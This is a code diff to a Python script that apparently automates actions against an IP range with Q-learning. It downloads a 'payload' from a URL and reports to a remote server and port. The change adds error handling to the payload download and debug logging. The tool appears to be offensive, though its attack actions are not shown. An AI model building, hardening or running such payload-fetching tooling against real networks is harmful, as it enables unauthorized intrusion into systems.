@@ -209,8 +209,12 @@ def main(ip_range: List[str], remote_server: str, port: int, payload_url: str) -
     max_state = MAX_STATE
 
     # Download the payload
-    with urllib.request.urlopen(payload_url) as f:
-        payload = f.read().decode("utf-8")
+    try:
+        with urllib.request.urlopen(payload_url) as f:
+            payload = f.read().decode("utf-8")
+    except urllib.error.URLError as e:
+        logging.error(f"Error downloading payload: {e}")
+        sys.exit(1)
 
     # Start the main loop
     for episode in range(MAX_EPISODES):
@@ -218,9 +222,11 @@ def main(ip_range: List[str], remote_server: str, port: int, payload_url: str) -
 
         # Choose an action based on the current state and the Q-table
         action = choose_action(q_table, state, exploration_probability)
+        logging.debug(f"Chose action {action} for state {state}")
 
         # Take the action and get the reward and the next state
         reward, next_state = take_action(action, state.ip)
+        logging.debug(f"Received reward {reward} and transitioned to state {next_state}")
 
         # Update the Q-table based on the reward and the next state
         if next_state is not None:
